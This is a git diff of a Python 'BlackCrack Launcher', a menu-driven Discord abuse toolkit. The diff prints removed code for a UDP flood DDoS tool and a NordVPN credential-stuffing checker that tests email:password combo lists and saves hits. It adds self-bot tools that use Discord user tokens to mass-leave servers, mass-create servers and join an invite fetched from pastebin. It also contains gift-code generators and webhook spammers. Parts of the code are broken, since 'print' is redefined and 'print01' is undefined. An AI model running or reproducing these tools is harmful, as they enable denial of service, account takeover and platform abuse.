@@ -1,66 +1,70 @@
 import ctypes
-import string
-import os
-import requests
-import logging
-import json
-import asyncio
 import httpx
-import sys
-import os
 import time
-import socket
-import random
-from datetime import datetime
-import threading
+import string
 import discord
-import tkinter as tk
-from tkinter import filedialog
-import colorama
-from colorama import Back, Fore, Style, init
-import time
-import random, discord_webhook, fade
-from discord_webhook import DiscordWebhook, DiscordEmbed
-import sys, time
-from sys import stdout
+import requests
+import webbrowser
+import os.path
 import ipaddress
 import re
+import threading
 import socket
-import datetime
-
+import json
+import asyncio
+import sys, time
+from sys import stdout
+import colorama
+from colorama import Back, Fore, Style, init
+from time import sleep
+from requests.api import options
+from datetime import datetime
+from aiohttp import web
+import tkinter as tk
+from aiohttp import web
+from discord.ext import commands
+import random, discord_webhook, fade
 from pip._internal import commands
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from pypresence import Presence
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import tkinter as tk
+from tkinter import filedialog
+
 
 
 
 rpc = Presence("1028307148867911731")
 rpc.connect()
-rpc.update(state="Using BlackLauncher",details="BlackCrackOnTop!", large_image="blackcrack", buttons=[{"label": "Discord","url":"https://discord.gg/V7JetCEKF7"}])
+rpc.update(state="Using BlackLauncherFREE",details="BlackCrackOnTop!", large_image="blackcrack", buttons=[{"label": "Discord","url":"https://discord.gg/V7JetCEKF7"}])
 
 os.system("color b")
-os.system('title BlackCrackLauncher v 0.1.1  by godclicks#5105 BIgBadApache#1723')
+colorama.init(autoreset=True)
+os.system('title BlackCrackLauncher v 0.1.3  by godclicks#5105 BIgBadApache#1723')
 
-print("  ____  _            _     _____                _    ")
-print(" |  _ \| |          | |   / ____|              | |   ")
-print(" | |_) | | __ _  ___| | _| |     _ __ __ _  ___| | __")
-print(" |  _ <| |/ _` |/ __| |/ / |    | '__/ _` |/ __| |/ /")
-print(" | |_) | | (_| | (__|   <| |____| | | (_| | (__|   < ")
-print(" |____/|_|\__,_|\___|_|\_\\_____|_|  \__,_|\___|_|\_\ ")
+print(Fore.RED + "  ____  _            _     _____                _    ")
+print(Fore.RED + " |  _ \| |          | |   / ____|              | |   ")
+print(Fore.RED + " | |_) | | __ _  ___| | _| |     _ __ __ _  ___| | __")
+print(Fore.RED + " |  _ <| |/ _` |/ __| |/ / |    | '__/ _` |/ __| |/ /")
+print(Fore.RED + " | |_) | | (_| | (__|   <| |____| | | (_| | (__|   < ")
+print(Fore.RED + " |____/|_|\__,_|\___|_|\_\\_____|_|  \__,_|\___|_|\_\ ")
 print("")
+print(Fore.GREEN + "https://discord.gg/V7JetCEKF7")
 print("")
-print("BlackCrack Launcher")
+print(Fore.RED + "BlackCrack Launcher Free Version")
 print("")
+print(Fore.GREEN + "[*] = Free")
+print(Fore.GREEN + "[!] = Paid")
 print("")
-print("1. NitroGenerator             |      5. DcToken Login        |       9. Token Spammer")
-print("                              |                              |")
-print("2. PscGenerator               |      6. Discord Cloner       |       10. Webhook Spotter")
-print("                              |                              |")
-print("3. DDos-Tool                  |      7. Port Scanner         |       11. Webhook Spammer")
-print("                              |                              |")
-print("4. Pinger                     |      8. Nordvpn Generator    |       ")
-print("                              |                              |")
+print(Fore.CYAN + "1. [*] NitroGenerator         |      5. [*] DcToken Login    |       9. [!] Token Spammer    |       13. [*] Mass Servercreate")
+print(Fore.CYAN + "                              |                              |                               |")
+print(Fore.CYAN + "2. [*] PscGenerator           |      6. [*] Discord Cloner   |       10. [*] Webhook Spotter |       14. [!] DM Spammer")
+print(Fore.CYAN + "                              |                              |                               |")
+print(Fore.CYAN + "3. [!] DDos-Tool              |      7. [!] Port Scanner     |       11. [*] Webhook Spammer |       15. Credits")
+print(Fore.CYAN + "                              |                              |                               |")
+print(Fore.CYAN + "4. [*] Pinger                 |      8. [!] Nordvpn Gen      |       12. [*] TServerleaver   |")
+print(Fore.CYAN + "                              |                              |                               |")
 
 
 
@@ -78,13 +82,18 @@ nordgen = 8
 tspammer = 9
 wspotter = 10
 wspammer = 11
+tSleaver = 12
+Smasscreate = 13
+DMspam = 14
+Credits = 15
 
 Black = int(input("/:"))
+
 
 if Black == 1:
     os.system("cls")
     LICNESE = """
-    made by godclicks#0001 pls do not steal ;)
+    made by godclicks#0001
     """
 
     USE_WEBHOOK = True
@@ -280,13 +289,13 @@ elif Black == 2:
 
     def main():
         while True:
-            code = random.randint(1000000000000000, 9999999999999999)
+            code = random.randint(100000000000000, 999999999999999)
             os.system("cls")
             print(banner)
             print(f"                     [{green}+{reset}] New Code: {blue}{code}{reset}")
             time.sleep(0.5)
             webhook = DiscordWebhook(url=input_webhook)
-            embed = DiscordEmbed(title='PSC Generator', description=f"`➕` Code: {code}",
+            embed = DiscordEmbed(title='PSC Generator', description=f"`➕` Code: 0{code}",
                                  color=random.choice(colors_list))
             webhook.add_embed(embed)
             time.sleep(0.5)
@@ -297,41 +306,12 @@ elif Black == 2:
 
 
 elif Black == 3:
-    now = datetime.now()
-    hour = now.hour
-    minute = now.minute
-    day = now.day
-    month = now.month
-    year = now.year
-
-    ##############
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1490)
-    #############
+    print(Fore.RED + "This is a Thing from the Paid Version! ")
+    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
+    sleep(5)
     os.system("cls")
-    print("Note: DON'T USE IT WITHOUT A VPN/PROXY")
-    ip = str(input("IP Target : "))
-    port = int(input("Port       : "))
-
-    print("[                    ] 0% ")
-    time.sleep(2)
-    print("[=====               ] 25%")
-    time.sleep(5)
-    print("[==========          ] 50%")
-    time.sleep(4)
-    print("[===============     ] 75%")
-    time.sleep(1)
-    print("[====================] 100%")
-    time.sleep(3)
-    sent = 0
-    while True:
-        sock.sendto(bytes, (ip, port))
-        sent = sent + 1
-        port = port + 0
-        print("Sent %s packet to %s throught port:%s"%(sent, ip, port))
-        if port == 65534:
-            port = 1
-
+    os.system("main.py")
+    sys.exit()
 elif Black == 4:
     def ipping():
         os.system("cls")
@@ -436,512 +416,33 @@ elif Black == 6:
     client.run(token, bot=False)
 
 elif Black == 7:
-    # Regular Expression Pattern to extract the number of ports you want to scan.
-    # You have to specify <lowest_port_number>-<highest_port_number> (ex 10-100)
-    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
-    # Initialising the port numbers, will be using the variables later on.
-    port_min = 0
-    port_max = 65535
-
-    # This script uses the socket api to see if you can connect to a port on a specified ip address.
-    # Once you've successfully connected a port is seen as open.
-    # This script does not discriminate the difference between filtered and closed ports.
-
-    # Basic user interface header
-    print("Scan Ports")
+    print(Fore.RED + "This is a Thing from the Paid Version! ")
+    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
+    sleep(5)
     os.system("cls")
-    open_ports = []
-    while True:
-        ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
-        try:
-            ip_address_obj = ipaddress.ip_address(ip_add_entered)
-            print("You entered a valid ip address.")
-            break
-        except:
-            print("You entered an invalid ip address")
-
-    while True:
-        print("Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
-        port_range = input("Enter port range: ")
-        port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
-        if port_range_valid:
-            port_min = int(port_range_valid.group(1))
-            port_max = int(port_range_valid.group(2))
-            break
-
-    for port in range(port_min, port_max + 1):
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(0.5)
-                s.connect((ip_add_entered, port))
-                open_ports.append(port)
-
-        except:
-            print("No Ports where open there...")
-            pass
-
-    for port in open_ports:
-        # We use an f string to easily format the string with variables so we don't have to do concatenation.
-        print(f"Port {port} is open on {ip_add_entered}.")
-
-
+    os.system("main.py")
+    sys.exit()
 elif Black == 8:
-    init(convert=True)
-
-    lock = threading.Lock()
-
-
-    def free_print(arg):
-        lock.acquire()
-        stdout.flush()
-        print(arg)
-        lock.release()
-
-
-    class NordVPN:
-        def __init__(self):
-            self.data = {
-                'use_proxy': False,
-                'proxy_type': None,
-                'proxy_dir': None,
-                'combo_dir': None,
-                'checked': 0,
-                'retries': 0,
-                'cpm': 0,
-            }
-
-            self.custom = ''
-            root = tk.Tk()
-            root.withdraw()
-
-        def __read(self, filename, method):
-            output = []
-            with open(filename, method, encoding='UTF-8') as file:
-                lines = file.readlines()
-                for l in lines:
-                    output.append(l.replace('\n', ''))
-
-            return output
-
-        def __make_copy(self):
-            with open('data/temp_combo.txt', 'w', encoding='UTF-8') as file:
-                accounts = self.__get_accounts()
-                for x in accounts:
-                    file.write(x + '\n')
-
-        def __get_accounts(self):
-            account_list = self.__read(self.data['combo_dir'], 'r')
-            return account_list
-
-        def __get_proxy(self, proxy_type, direct):
-            proxy_list = self.__read(self.data['proxy_dir'], 'r')
-            proxies = {'http': '%s://%s' % (self.data['proxy_type'], random.choice(proxy_list))}
-
-            return proxies
-
-        def custom_message(self, arg):
-            self.custom = arg
-
-        def cpm_counter(self):
-            while True:
-                previous = self.data['checked']
-                time.sleep(4)
-                after = self.data['checked']
-                self.data['cpm'] = (after - previous) * 15
-
-        def update_title(self):
-            while True:
-                elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
-                os.system(
-                    'title NordVPN Checker - Checked: %s ^| Retries: %s ^| CPM: %s ^| Time Elapsed: %s ^| Threads: %s' % (
-                    self.data['checked'], self.data['retries'], self.data['cpm'], elapsed,
-                    (threading.active_count() - 2)))
-                time.sleep(0.4)
-
-        def title(self):
-            print(f'''{Fore.CYAN}
-
-        \t\t\t\t __      _______  _   _  _____            
-        \t\t\t\t \ \    / /  __ \| \ | |/ ____|           
-        \t\t\t\t  \ \  / /| |__) |  \| | |  __  ___ _ __  
-        \t\t\t\t   \ \/ / |  ___/| . ` | | |_ |/ _ \ '_ \ 
-        \t\t\t\t    \  /  | |    | |\  | |__| |  __/ | | 
-        \t\t\t\t     \/   |_|    |_| \_|\_____|\___|_| |_|
-        \t\t\t\t                                          
-
-                {Style.RESET_ALL}''')
-
-        def user_proxy(self):
-            self.data['use_proxy'] = True
-
-            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose choose proxy text file. ')
-
-            proxy_dir = filedialog.askopenfilename()
-            self.data['proxy_dir'] = proxy_dir
-
-            try:
-                proxy_type = int(input(
-                    f'[{Fore.CYAN}?{Style.RESET_ALL}] HTTPS[{Fore.CYAN}0{Style.RESET_ALL}]/SOCKS4[{Fore.CYAN}1{Style.RESET_ALL}]/SOCKS5[{Fore.CYAN}2{Style.RESET_ALL}] > '))
-
-            except ValueError:
-                print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Value error! Please choose 0, 1, or 2!')
-                time.sleep(3)
-                self.user_proxy()
-
-            if proxy_type == 0:
-                self.data['proxy_type'] = 'https'
-
-            elif proxy_type == 1:
-                self.data['proxy_type'] = 'socks4'
-
-            elif proxy_type == 2:
-                self.data['proxy_type'] = 'socks5'
-
-            else:
-                print(f'[{Fore.CYAN}!{Style.RESET_ALL}] Please choose a valid int such as 0, 1, or 2!')
-                time.sleep(3)
-                self.user_proxy()
-
-        def user_combo(self):
-            combo_dir = filedialog.askopenfilename()
-            self.data['combo_dir'] = combo_dir
-
-            self.__make_copy()
-
-        def get_accounts(self):
-            account_list = self.__read('data/temp_combo.txt', 'r')
-            return account_list
-
-        def get_data(self):
-            return self.data
-
-        def checker(self, email, password):
-            url = 'https://api.nordvpn.com/v1/users/tokens'
-            data = {'username': email, 'password': password}
-
-            if self.data['use_proxy']:
-                proxies = self.__get_proxy(self.data['proxy_type'], self.data['proxy_dir'])
-
-                try:
-
-                    r = requests.post(url, json=data, proxies=proxies)
-
-                    if 'Unauthorized' in r.text:
-                        free_print(f'[*] {Fore.RED}BAD{Style.RESET_ALL} | {email}:{password}')
-                        with open('output/bad.txt', 'a', encoding='UTF-8') as f: f.write('%s:%s\n' % (email, password))
-
-                    if 'user_id' in r.text:
-                        expiry = r.json()['expires_at']
-                        free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
-                        with open('output/raw_hits.txt', 'a', encoding='UTF-8') as f: f.write(
-                            '%s:%s\n' % (email, password))
-                        with open('output/hits.txt', 'a', encoding='UTF-8') as f: f.write(
-                            '%s:%s | Expiry Date: %s %s\n' % (email, password, expiry, self.custom))
-
-                    if 'Too Many Requests' in r.text:
-                        free_print(
-                            f'[!] {Fore.RED}ERROR, TOO MANY REQUESTS. Change your proxies or use a different VPN. {Style.RESET_ALL}')
-
-                    self.data['checked'] += 1
-                except requests.exceptions.RequestException:  # all requests related errors
-                    self.data['retries'] += 1
-                    self.checker(email, password)
-
-            else:
-                try:
-                    r = requests.post(url, json=data)
-
-                    if 'Unauthorized' in r.text:
-                        free_print(f'[*] {Fore.RED}BAD{Style.RESET_ALL} | {email}:{password} ')
-                        with open('output/bad.txt', 'a', encoding='UTF-8') as f: f.write('%s:%s\n' % (email, password))
-
-                    if 'user_id' in r.text:
-                        expiry = r.json()['expires_at']
-                        free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
-                        with open('output/raw_hits.txt', 'a', encoding='UTF-8') as f: f.write(
-                            '%s:%s\n' % (email, password))
-                        with open('output/hits.txt', 'a', encoding='UTF-8') as f: f.write(
-                            '%s:%s | Expiry Date: %s %s\n' % (email, password, expiry, self.custom))
-
-                    if 'Too Many Requests' in r.text:
-                        free_print(
-                            f'[!] {Fore.RED}ERROR, TOO MANY REQUESTS. Change your proxies or use a different VPN. {Style.RESET_ALL}')
-
-                    self.data['checked'] += 1
-                except requests.exceptions.RequestException:
-                    self.data['retries'] += 1
-                    self.checker(email, password)
-
-        def multi_threading(self):
-            self.start = time.time()
-            threading.Thread(target=self.cpm_counter, daemon=True).start()
-            threading.Thread(target=self.update_title, daemon=True).start()
-
-
-    check = None
-
-
-    def worker(n, combos, thread_id):
-        global check
-
-        while check[thread_id] < len(combos):
-            combination = combos[check[thread_id]].split(':')
-            n.checker(combination[0], combination[1])
-            check[thread_id] += 1
-
-
-    def main():
-        global check
-        os.system('cls')
-
-        n = NordVPN()
-        n.title()
-        print('\n\n')
-
-        use_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add custom message after hit? y/n  > ')
-
-        if use_message == 'y':
-            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] This message will be added to the text file if it is a hit.')
-            custom_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add: ')
-            n.custom_message(custom_message)
-
-        use_proxy = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Use proxy? y/n > ')
-
-        if use_proxy == 'y':
-            n.user_proxy()
-
-        print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose combo list text file. (email:pass)')
-
-        n.user_combo()  # get file directory
-
-        combos = n.get_accounts()  # combo in list
-
-        thread_count = int(input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Enter number of threads > '))
-
-        n.multi_threading()
-
-        os.system('cls')
-        n.title()
-        print('\n\n')
-
-        threads = []
-
-        check = [0 for i in range(thread_count)]
-
-        for i in range(thread_count):
-            sliced_combo = combos[int(len(combos) / thread_count * i): int(len(combos) / thread_count * (i + 1))]
-            t = threading.Thread(target=worker, args=(n, sliced_combo, i,))
-            threads.append(t)
-            t.start()
-
-        for t in threads:
-            t.join()
-
-        print('[!] Task completed.')
-
-        os.system('pause>nul')
-
-
-    if __name__ == '__main__':
-        main()
-
+    print(Fore.RED + "This is a Thing from the Paid Version! ")
+    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
+    sleep(5)
+    os.system("cls")
+    os.system("main.py")
+    sys.exit()
 elif Black == 9:
-    import sys, time
-    def print015(text):
-        for c in text:
-            sys.stdout.write(c)
-            sys.stdout.flush()
-            time.sleep(0.015)
-        sys.stdout.write("\n")
-
-
-    def print01(text):
-        for c in text:
-            sys.stdout.write(c)
-            sys.stdout.flush()
-            time.sleep(0.015)
-
-
-    try:
-        import colorama, requests
-    except:
-        sys.stdout.write("> ")
-        print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
-        input("")
-        try:
-            import os
-
-            os.system("pip install colorama requests")
-        except:
-            pass
-        sys.stdout.write("> ")
-        print015("Problem Maybe Fixed Now, Restart The Program")
-        input("")
-        exit()
-
-    colorama.init(autoreset=True)
-
-    import os, threading
-
-
-    def set_title():
-        title = "Discord Token Spammer"
-        try:
-            import requests
-            text = str(requests.get("https://pastebin.com/R3adGJ6h").text)
-            os.system(f"title {title}{text}")
-        except:
-            os.system(f"title {title}")
-
-
-    threading.Thread(target=set_title).start()
-
-    import threading, time, random
-
-
-    def single_spammer():
-        invite_code = str(requests.get("https://pastebin.com/raw/9SxbfxE8").text)
-        while True:
-            sys.stdout.write(colorama.Fore.CYAN + "> ")
-            print01("Enter Token: ")
-            tokens = input("")
-            r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
-            if "200" not in str(r1):
-                sys.stdout.write(colorama.Fore.RED + "> ")
-                print015("Invalid Token")
-            if "200" in str(r1):
-                r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
-                if "200" in str(r):
-                    break
-                if "403" in str(r):
-                    sys.stdout.write(colorama.Fore.RED + "> ")
-                    print015("Locked Token")
-
-        while True:
-            try:
-                sys.stdout.write(colorama.Fore.CYAN + "> ")
-                print01("Enter Delay (0 For None): ")
-                delay = input("")
-                delay = float(delay)
-                break
-            except:
-                sys.stdout.write(colorama.Fore.RED + "> ")
-                print015("Enter A Valid Choice")
-        sys.stdout.write(colorama.Fore.CYAN + "> ")
-        print01("Enter Msg To Spam: ")
-        msg = input("")
-
-        while True:
-            try:
-                sys.stdout.write(colorama.Fore.CYAN + "> ")
-                print01("Enter Channel Id: ")
-                channel = int(input(""))
-                break
-            except:
-                sys.stdout.write(colorama.Fore.RED + "> ")
-                print015("Enter A Valid Choice")
-
-        while True:
-            try:
-                sys.stdout.write(colorama.Fore.CYAN + "> ")
-                print01("Enter Amount Of Messages To Send: ")
-                amount = int(input(""))
-                break
-            except:
-                sys.stdout.write(colorama.Fore.RED + "> ")
-                print015("Enter A Valid Choice")
-        headers = {
-            "authorization": tokens
-        }
-        json = {
-            "content": msg,
-            "tts": False
-        }
-        done = 0
-        while True:
-            try:
-                r = requests.post("https://discord.com/api/v9/channels/" + str(channel) + "/messages", headers=headers,
-                                  json=json)
-                r = str(r)
-                if "200" in r:
-                    done = int(done) + 1
-                    print(
-                        f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(done)}{colorama.Fore.CYAN}/{colorama.Fore.RESET}{str(amount)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Succsesfully Sent Message In {colorama.Fore.CYAN + str(channel)}")
-                else:
-                    sys.stdout.write(colorama.Fore.CYAN + "> ")
-                    print(f"Unknown Error{colorama.Fore.CYAN}/{colorama.Fore.RESET}Rate Limited")
-            except:
-                sys.stdout.write(colorama.Fore.CYAN + "> ")
-                print("Unknown Error")
-            if str(done) == str(amount):
-                sys.stdout.write(colorama.Fore.CYAN + "> ")
-                print("Done Spamming")
-                input("")
-                exit()
-            time.sleep(float(delay))
-
-
-    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
-               "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
-               "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
-
-    fail = 0
-
-
-    def spammer(tokens, channel, msg, delay, proxy, ren):
-        global sent, fail
-        headers = {
-            "authorization": tokens
-        }
-
-        while True:
-            if ren == "n":
-                json = {"content": msg, "tts": False}
-            if ren == "y":
-                json = {"content": msg + " | " + "".join(random.choices(choices, k=5)), "tts": False}
-
-            try:
-                if proxy == "":
-                    r = requests.post("https://discord.com/api/v9/channels/" + str(channel) + "/messages",
-                                      headers=headers, json=json)
-                if proxy != "":
-                    r = requests.post("https://discord.com/api/v9/channels/" + str(channel) + "/messages",
-                                      headers=headers, json=json, proxies={"http": proxy, "https": proxy})
-
-                r = str(r)
-                if "200" in r:
-                    sent = int(sent) + 1
-                else:
-                    fail = int(fail) + 1
-            except:
-                pass
-            time.sleep(float(delay))
-
-
-    sent = 0
-
-    while True:
-        sys.stdout.write(colorama.Fore.CYAN + "1. ")
-        print015("Single Token Spammer")
-        sys.stdout.write(colorama.Fore.CYAN + "> ")
-        tools = input("")
-        if tools == "1" or tools == "2":
-            break
-        else:
-            print("Enter A Valid Choice")
-
-    if tools == "1":
-        single_spammer()
-    if tools == "2":
-        os.system("start main.py")
-
+    print(Fore.RED + "This is a Thing from the Paid Version! ")
+    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
+    sleep(5)
+    os.system("cls")
+    os.system("main.py")
+    sys.exit()
 elif Black == 10:
     error = False
     import os, threading
     import sys, time
 
 
-    def print015(text):
+    def print(text):
         for c in text:
             sys.stdout.write(c)
             sys.stdout.flush()
@@ -949,7 +450,7 @@ elif Black == 10:
         sys.stdout.write("\n")
 
 
-    def print01(text):
+    def print(text):
         for c in text:
             sys.stdout.write(c)
             sys.stdout.flush()
@@ -960,7 +461,7 @@ elif Black == 10:
         import colorama, requests
     except:
         sys.stdout.write("> ")
-        print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
+        print("Missing Required Modules, Press Enter To Download (May Not Always Work)")
         input("")
         try:
             import os
@@ -969,7 +470,7 @@ elif Black == 10:
         except:
             pass
         sys.stdout.write("> ")
-        print015("Problem Maybe Fixed Now, Restart The Program")
+        print("Problem Maybe Fixed Now, Restart The Program")
         input("")
         exit()
 
@@ -1010,14 +511,14 @@ elif Black == 10:
 
     def valid():
         sys.stdout.write(colorama.Fore.RED + "> ")
-        print015("Enter A Valid Choice")
+        print("Enter A Valid Choice")
         return
 
 
     while True:
         try:
             sys.stdout.write(colorama.Fore.CYAN + "> ")
-            print01("Enter How Many Threads You Want: ")
+            print("Enter How Many Threads You Want: ")
             threads = input("")
             threads = int(threads)
             break
@@ -1025,7 +526,7 @@ elif Black == 10:
             valid()
     while True:
         sys.stdout.write(colorama.Fore.CYAN + "> ")
-        print01("Wanna Auto Save Webhooks (y/n): ")
+        print("Wanna Auto Save Webhooks (y/n): ")
         save = input("")
         if save == "y" or save == "n":
             break
@@ -1034,7 +535,7 @@ elif Black == 10:
     while True:
         try:
             sys.stdout.write(colorama.Fore.CYAN + "> ")
-            print01("Enter Delay For Each Thread (0 = No Delay): ")
+            print("Enter Delay For Each Thread (0 = No Delay): ")
             delay = input("")
             delay = float(delay)
             break
@@ -1093,13 +594,213 @@ elif Black == 11:
     if support == "Y":
         for i in range(tyme):
             proxy_spam()
+            os.system("start main.py")
+            sys.exit()
     elif support == "1":
         for i in range(tyme):
             proxyless_spam()
     else:
         sys.exit()
 
+elif Black == 12:
+    print("The Tokens leave the server")
+    def bot_leaver(guild_id, token):
+        headers = {'Authorization': token}
+        apilink = "https://discord.com/api/v8/users/@me/guilds/" + guild_id
+        r = requests.delete(apilink, headers=headers)
+        print("[!] Left server ")
 
+
+    def main():
+        tokens = []
+
+        with open("tokens.txt", "r") as tokens_file:
+            lines = tokens_file.readlines()
+            for l in lines:
+                tokens.append(l.replace('\n', ''))
+
+        guild_id = input('[!] Enter server ID: ')
+
+        input("Hit ENTER to leave discord server.")
+        for botzz in tokens:
+            bot_leaver(guild_id, botzz)
+
+
+    if __name__ == "__main__":
+        main()
+
+elif Black == 13:
+    def print(text):
+        for c in text:
+            sys.stdout.write(c)
+            sys.stdout.flush()
+            time.sleep(0.015)
+        sys.stdout.write("\n")
+
+
+    def print(text):
+        for c in text:
+            sys.stdout.write(c)
+            sys.stdout.flush()
+            time.sleep(0.015)
+
+
+    import os, threading
+
+
+    def set_title():
+        title = "Discord Mass Server Creator"
+        try:
+            import requests
+            text = str(requests.get("https://pastebin.com/raw/vCkUFiZ8").text)
+            os.system(f"title {title}{text}")
+        except:
+            os.system(f"title {title}")
+
+
+    threading.Thread(target=set_title).start()
+
+    try:
+        import colorama, requests
+    except:
+        sys.stdout.write("> ")
+        print("Missing Required Modules, Press Enter To Download (May Not Always Work)")
+        input("")
+        try:
+            import os
+
+            os.system("pip install colorama requests")
+        except:
+            pass
+        sys.stdout.write("> ")
+        print("Problem Maybe Fixed Now, Restart The Program")
+        input("")
+        exit()
+
+    colorama.init(autoreset=True)
+
+    sys.stdout.write(colorama.Fore.CYAN + "> ")
+    print("Version 1.7.3 Is The Required Version Of Discord.py, Press Enter To Start The Main Program")
+    input("")
+
+    alle = 0
+
+
+    def create():
+        global alle
+        url = "https://discord.com/api/v9/guilds"
+        json = {
+            "name": name,
+            "icon": None,
+            "channels": [],
+            "system_channel_id": None,
+            "guild_template_code": None
+        }
+        while True:
+            re = requests.post(url, headers={"authorization": tokens}, json=json)
+            re = str(re)
+            if "201" in re:
+                break
+            if "201" not in re and "429" not in re:
+                break
+        alle = int(alle) + 1
+
+
+    def creator():
+        global alle
+        global name, tokens
+        while True:
+            try:
+                sys.stdout.write(colorama.Fore.CYAN + "> ")
+                print("Enter Amount Of Servers To Create: ")
+                amount = int(input(""))
+                break
+            except:
+                sys.stdout.write(colorama.Fore.RED + "> ")
+                print("Enter A Valid Choice")
+        invite_code = str(requests.get("https://pastebin.com/raw/9SxbfxE8").text)
+        while True:
+            sys.stdout.write(colorama.Fore.CYAN + "> ")
+            print("Enter Token: ")
+            tokens = input("")
+            r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
+            if "200" not in str(r1):
+                sys.stdout.write(colorama.Fore.RED + "> ")
+                print("Invalid Token")
+            if "200" in str(r1):
+                r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
+                if "200" in str(r):
+                    break
+                if "403" in str(r):
+                    sys.stdout.write(colorama.Fore.RED + "> ")
+                    print("Locked Token")
+
+        sys.stdout.write(colorama.Fore.CYAN + "> ")
+        print("Enter What Server Name Should Be (Name Cant Only Be An Number): ")
+        name = input("")
+        sys.stdout.write(colorama.Fore.CYAN + "> ")
+        print("Creating Servers...")
+        for u in range(int(amount)):
+            threading.Thread(target=create).start()
+            sys.stdout.write(colorama.Fore.CYAN + "> ")
+            print("Started Thread")
+        den = 0
+        while True:
+            if int(amount) == int(den):
+                break
+            for i in range(int(alle)):
+                alle = int(alle) - 1
+                den = int(den) + 1
+                sys.stdout.write(colorama.Fore.CYAN + "> ")
+                print(
+                    f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Created Server")
+        sys.stdout.write(colorama.Fore.CYAN + "> ")
+        print01("Done Creating Servers")
+        input("")
+        exit()
+
+
+    creator()
+
+elif Black == 14:
+    print(Fore.RED + "This is a Thing from the Paid Version! ")
+    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
+    sleep(5)
+    os.system("cls")
+    os.system("main.py")
+    sys.exit()
+elif Black == 15:
+    os.system("cls")
+    colorama.init(autoreset=True)
+    print("")
+    print("             [!] Credits [!]         ")
+    print("")
+    print("Developeteam: BlackCrack")
+    print("")
+    print(Fore.RED + "                             Developers:")
+    print("")
+    print(Fore.BLUE + "                                 godclicks#0001")
+    print("")
+    print(Fore.BLUE + "                                 BIgBadApache#1723")
+    print("")
+    print("")
+    print(Fore.CYAN + "Cool Dudes: ")
+    print("")
+    print(Fore.CYAN + "MxGTA#1746")
+    print("")
+    print(Fore.CYAN + "Bxnkq#6284")
+    print("")
+    print(Fore.CYAN + "Reddy#8613")
+    print("")
+    print(Fore.CYAN + "Cookie#7201")
+    print("")
+    print(Fore.BLUE + "Github: https://github.com/OfficialBlackCrack")
+    print("")
+    print(Fore.BLUE + "Discord:  https://discord.gg/V7JetCEKF7")
+    print("")
+    print(Fore.LIGHTYELLOW_EX + "GTA V Mod Menu Discord from [ Mr X ] ")
+    print(Fore.LIGHTYELLOW_EX + "https://discord.gg/3TGESFBs4S")
+    print("")
 
 
 print("")
